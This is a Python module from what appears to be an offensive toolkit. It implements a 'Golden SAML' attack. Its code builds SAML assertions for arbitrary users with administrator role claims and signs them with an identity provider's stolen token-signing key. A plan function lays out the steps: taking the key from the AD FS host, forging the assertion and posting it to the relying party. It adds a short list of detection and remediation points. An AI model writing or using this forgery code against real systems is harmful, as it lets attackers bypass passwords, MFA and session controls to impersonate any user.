# ============================================================================
# FILE: core/samlforge.py
# ============================================================================
"""Golden SAML: the assertion, built and signed with the IdP's own key.

The rung this implements is the one that makes every session control irrelevant. If you hold
the IdP's token-signing key, you can mint an assertion for any user, with any role, valid for
any window - and every resource that trusts that IdP accepts it, because it IS legitimately
signed. No password, no MFA, no device binding, no session to steal, nothing to detect on the
wire. That is why it sits above the session tier and why it is the last rung a credential-based
attack can reach.

What this module does: builds the assertion, builds the response, and signs the assertion with
XMLDSig (enveloped, RSA-SHA256, exclusive canonicalisation).

What it cannot do: obtain the key. The signing key lives in the IdP's certificate store (or on
the AD FS server), so it needs read access to that host - the tool refuses to sign without a
key rather than emitting an unsigned assertion that would be rejected, and it says plainly that
the key is the operator's problem.

The signature itself is pluggable: `cryptography` (an optional dependency, like playwright) does
RSA-SHA256, and a test can inject its own signer. Nothing here is silent about which half is
real.
"""
import base64
import hashlib
import re
import time
import uuid

__all__ = ["SamlForgeError", "assertion", "response", "c14n", "sign", "plan", "describe",
           "SAML_NS", "DS_NS"]

SAML_NS = "urn:oasis:names:tc:SAML:2.0:assertion"
DS_NS = "http://www.w3.org/2000/09/xmldsig#"
PROTO_NS = "urn:oasis:names:tc:SAML:2.0:protocol"

# The attribute names a SAML-to-role mapping usually reads. A forged assertion that names the
# right claim is the difference between "authenticated as the user" and "authenticated as an
# administrator".
ROLE_CLAIMS = (
    "http://schemas.microsoft.com/ws/2008/06/identity/claims/role",
    "http://schemas.xmlsoap.org/claims/Group",
    "http://schemas.microsoft.com/ws/2008/06/identity/claims/windowsaccountname",
    "Role", "Group", "eduPersonAffiliation",
)


class SamlForgeError(RuntimeError):
    """A refusal the CLI can report verbatim."""


def _iso(ts):
    return time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(float(ts)))


def _esc(text):
    """XML-escape a value that lands inside an attribute or element text.

    `assertion()` escaped its fields; `response()` interpolated the issuer, the destination
    and InResponseTo raw, so a hostile issuer/destination (or an operator's typo) injected
    markup into the envelope. Both now escape.
    """
    return (str(text).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
            .replace('"', "&quot;"))


def assertion(issuer, audience, subject, not_before=None, not_after=None, attributes=None,
              name_id_format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified",
              in_response_to="", assertion_id="", session_index="", authn_instant=None):
    """A SAML 2.0 assertion for `subject` at `audience`, issued by `issuer`.

    `attributes` is {name: value} (or {name: [values]}): that is where the role claim goes, and
    it is the part that decides what the account can do once it lands.
    """
    if not str(issuer or "").strip():
        raise SamlForgeError("an assertion needs an issuer (the IdP's entity id)")
    if not str(audience or "").strip():
        raise SamlForgeError("an assertion needs an audience (the relying party's entity id)")
    if not str(subject or "").strip():
        raise SamlForgeError("an assertion needs a subject")
    now = time.time()
    nb = float(not_before if not_before is not None else now - 300)
    na = float(not_after if not_after is not None else now + 3600)
    if na <= nb:
        raise SamlForgeError("not_after must be later than not_before")
    aid = assertion_id or f"_{uuid.uuid4()}"
    authn = float(authn_instant if authn_instant is not None else now)
    esc = _esc

    attrs = ""
    for name, value in (attributes or {}).items():
        values = value if isinstance(value, (list, tuple)) else [value]
        rows = "".join(
            f'<saml:AttributeValue xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"'
            f' xsi:type="xs:string">{esc(v)}</saml:AttributeValue>' for v in values)
        attrs += (f'<saml:Attribute Name="{esc(name)}" NameFormat='
                  f'"urn:oasis:names:tc:SAML:2.0:attrname-format:uri">{rows}</saml:Attribute>')
    attr_statement = f"<saml:AttributeStatement>{attrs}</saml:AttributeStatement>" if attrs else ""
    response_to = (f' InResponseTo="{esc(in_response_to)}"' if in_response_to else "")
    return (
        f'<saml:Assertion xmlns:saml="{SAML_NS}" ID="{esc(aid)}" Version="2.0"'
        f' IssueInstant="{_iso(now)}"{response_to}>'
        f'<saml:Issuer>{esc(issuer)}</saml:Issuer>'
        f'<saml:Subject><saml:NameID Format="{esc(name_id_format)}">{esc(subject)}</saml:NameID>'
        f'<saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">'
        f'<saml:SubjectConfirmationData NotOnOrAfter="{_iso(na)}"'
        f' Recipient="{esc(audience)}"{response_to}/>'
        f'</saml:SubjectConfirmation></saml:Subject>'
        f'<saml:Conditions NotBefore="{_iso(nb)}" NotOnOrAfter="{_iso(na)}">'
        f'<saml:AudienceRestriction><saml:Audience>{esc(audience)}</saml:Audience>'
        f'</saml:AudienceRestriction></saml:Conditions>'
        f'<saml:AuthnStatement AuthnInstant="{_iso(authn)}"'
        + (f' SessionIndex="{esc(session_index)}"' if session_index else "")
        + '><saml:AuthnContext><saml:AuthnContextClassRef>'
          'urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport'
          '</saml:AuthnContextClassRef></saml:AuthnContext></saml:AuthnStatement>'
        + attr_statement + "</saml:Assertion>")


def response(assertion_xml, issuer, destination="", in_response_to="", status="Success",
             response_id=""):
    """The protocol envelope the SP actually receives.

    Every value that lands in the XML is escaped: `issuer`, `destination`, `in_response_to`
    and `response_id` come from the operator (or a target's metadata) and were interpolated
    raw, so markup in any of them broke the envelope or injected a second element.
    """
    rid = _esc(response_id) if response_id else f"_{uuid.uuid4()}"
    now = time.time()
    status_code = ("urn:oasis:names:tc:SAML:2.0:status:Success" if status == "Success"
                   else "urn:oasis:names:tc:SAML:2.0:status:Requester")
    return (
        f'<samlp:Response xmlns:samlp="{PROTO_NS}" ID="{rid}" Version="2.0"'
        f' IssueInstant="{_iso(now)}" Destination="{_esc(destination)}"'
        + (f' InResponseTo="{_esc(in_response_to)}"' if in_response_to else "")
        + f'><saml:Issuer xmlns:saml="{SAML_NS}">{_esc(issuer)}</saml:Issuer>'
        + f'<samlp:Status><samlp:StatusCode Value="{status_code}"/></samlp:Status>'
        + assertion_xml + "</samlp:Response>")


def c14n(xml_text):
    """Exclusive-ish canonicalisation: strip inter-tag whitespace, sort attributes.

    Deliberately minimal, and named as such. A full exc-C14N implementation is a specification
    of its own; this covers what an assertion built by `assertion()` needs (no comments, no
    inherited namespaces beyond the declared ones), and a real deployment signs the output of a
    proper library.
    """
    text = re.sub(r">\s+<", "><", str(xml_text or "").strip())

    def fix(match):
        tag, attrs = match.group(1), match.group(2)
        pairs = re.findall(r'([\w:.-]+)="([^"]*)"', attrs)
        if not pairs:
            return match.group(0)
        ordered = " ".join(f'{k}="{v}"' for k, v in sorted(pairs))
        return f"<{tag} {ordered}{match.group(3)}>"
    # the self-closing form matters: an empty element with attributes is common in assertions
    return re.sub(r"<([\w:.-]+)((?:\s+[\w:.-]+=\"[^\"]*\")+)\s*(/?)>", fix, text)


def sign(xml_text, key_pem="", cert_b64="", signer=None, reference_id="", digest="sha256"):
    """Enveloped XMLDSig over the assertion.

    `signer(data: bytes) -> bytes` is injectable. Without it, an RSA-SHA256 signer is built from
    `key_pem` when `cryptography` is installed; otherwise this refuses, because an unsigned
    assertion is not a forged one - the SP will reject it.
    """
    if not str(xml_text or "").strip():
        raise SamlForgeError("nothing to sign")
    body = c14n(xml_text)
    match = re.search(r'\bID="([^"]+)"', body)
    ref_id = reference_id or (match.group(1) if match else "")
    if not ref_id:
        raise SamlForgeError("the assertion has no ID to reference")
    canonical = body
    if digest == "sha256":
        digest_value = base64.b64encode(hashlib.sha256(canonical.encode()).digest()).decode()
        digest_alg = "http://www.w3.org/2001/04/xmlenc#sha256"
        sig_alg = "http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"
    elif digest == "sha1":
        digest_value = base64.b64encode(hashlib.sha1(canonical.encode()).digest()).decode()
        digest_alg = "http://www.w3.org/2000/09/xmldsig#sha1"
        sig_alg = "http://www.w3.org/2000/09/xmldsig#rsa-sha1"
    else:
        raise SamlForgeError(f"unsupported digest {digest!r}")

    signed_info = (
        f'<ds:SignedInfo xmlns:ds="{DS_NS}">'
        f'<ds:CanonicalizationMethod Algorithm='
        f'"http://www.w3.org/2001/10/xml-exc-c14n#"/>'
        f'<ds:SignatureMethod Algorithm="{sig_alg}"/>'
        f'<ds:Reference URI="#{ref_id}"><ds:Transforms><ds:Transform Algorithm='
        f'"http://www.w3.org/2000/09/xmldsig#enveloped-signature"/>'
        f'<ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>'
        f'</ds:Transforms><ds:DigestMethod Algorithm="{digest_alg}"/>'
        f'<ds:DigestValue>{digest_value}</ds:DigestValue></ds:Reference></ds:SignedInfo>')
    if signer is None:
        signer = _rsa_signer(key_pem)
    signature_value = base64.b64encode(signer(c14n(signed_info).encode())).decode()
    key_info = (f'<ds:KeyInfo><ds:X509Data><ds:X509Certificate>{cert_b64}'
                f'</ds:X509Certificate></ds:X509Data></ds:KeyInfo>' if cert_b64 else
                "<ds:KeyInfo><ds:X509Data/></ds:KeyInfo>")
    signature = (f'<ds:Signature xmlns:ds="{DS_NS}">{signed_info}'
                 f'<ds:SignatureValue>{signature_value}</ds:SignatureValue>'
                 f'{key_info}</ds:Signature>')
    # enveloped: the signature goes inside the assertion, right after the Issuer
    if "</saml:Issuer>" in body:
        return body.replace("</saml:Issuer>", "</saml:Issuer>" + signature, 1)
    return body.replace(">", ">" + signature, 1)


def _rsa_signer(key_pem):
    if not str(key_pem or "").strip():
        raise SamlForgeError(
            "no signing key: the IdP's token-signing key is what makes this work, and it is "
            "not something a session gives you (read it from the IdP host, then pass it here). "
            "An unsigned assertion is not a forged one - the relying party rejects it")
    try:
        from cryptography.hazmat.primitives import hashes, serialization
        from cryptography.hazmat.primitives.asymmetric import padding
    except ImportError as e:              # pragma: no cover - depends on the environment
        raise SamlForgeError(
            "signing needs the optional `cryptography` package (pip install cryptography), "
            "or pass your own signer") from e
    key = serialization.load_pem_private_key(str(key_pem).encode(), password=None)
    sign_fn = getattr(key, "sign", None)
    if sign_fn is None:
        raise SamlForgeError("that key cannot sign (it is a key-agreement key, not a signing "
                            "key): the IdP's token-signing key is an RSA private key")

    def _sign(data):
        return sign_fn(data, padding.PKCS1v15(), hashes.SHA256())
    return _sign


def plan(tenant="", issuer="", audience="", subject=""):
    """The steps, what each needs, and what the defender can see."""
    return {
        "issuer": issuer, "audience": audience, "subject": subject, "tenant": tenant,
        "steps": [
            {"step": 1, "what": "obtain the IdP's token-signing certificate and its private key",
             "needs": "read access to the IdP host (AD FS: the certificate store; cloud: the "
                      "enterprise application's signing material)"},
            {"step": 2, "what": "build the assertion for the subject and the role claim",
             "needs": "the relying party's entity id (the audience) and the claim names it "
                      "maps to roles"},
            {"step": 3, "what": "sign it (enveloped XMLDSig, RSA-SHA256) and POST it to the "
                                "relying party's ACS endpoint",
             "needs": "network reach to the ACS URL"},
        ],
        "why_it_is_the_top": ("the assertion is legitimately signed by the key the relying party "
                              "already trusts, so no password, MFA, device binding or session "
                              "control is consulted - and there is nothing on the wire that "
                              "looks wrong"),
        "visible": [
            "the IdP's own logs show no sign-in for that user (the assertion did not come from "
            "it) - this is the detection that actually works: correlate the SP's sign-ins "
            "against the IdP's",
            "a signing-certificate rollover is the remediation, and it invalidates every "
            "forged assertion",
            "an assertion whose IssueInstant is out of the IdP's own sequence is an outlier",
        ],
        "defender_priority": ("the signing key must not be exportable, the IdP host must not be "
                              "reachable from the identity plane, and the SP's sign-ins must be "
                              "correlated with the IdP's"),
    }


def describe(facts):
    if "steps" in (facts or {}):
        lines = [f"golden SAML plan ({facts.get('issuer') or 'issuer?'} -> "
                 f"{facts.get('audience') or 'audience?'})"]
        for step in facts["steps"]:
            lines.append(f"  {step['step']}. {step['what']}")
            lines.append(f"     needs: {step['needs']}")
        lines.append(f"  why it is the top: {facts['why_it_is_the_top']}")
        for item in facts["visible"]:
            lines.append(f"  visible: {item}")
        return "\n".join(lines)
    return f"golden SAML: {str(facts)[:200]}"
